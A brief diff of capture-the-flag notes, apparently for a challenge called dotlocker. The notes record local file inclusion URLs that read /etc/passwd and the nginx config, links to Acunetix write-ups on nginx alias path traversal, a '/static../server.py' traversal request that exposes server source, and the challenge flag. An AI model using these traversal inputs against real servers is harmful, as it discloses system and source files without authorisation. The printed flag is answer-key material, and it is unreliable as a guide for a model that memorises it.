@@ -1,0 +1,13 @@
+http://dotlocker.hackthe.vote/new/etc/skel/.bashrc
+	http://dotlocker.hackthe.vote/new/etc/passwd (LFI confirmed)
+
+http://dotlocker.hackthe.vote/new/etc/nginx/sites-enabled/default
+
+https://www.acunetix.com/vulnerabilities/web/
+	location ^~ /static
+
+https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/
+
+
+http://dotlocker.hackthe.vote/static../server.py
+	flag{0ff_by_sl4sh_n0w_1_hav3_y0ur_sourc3}
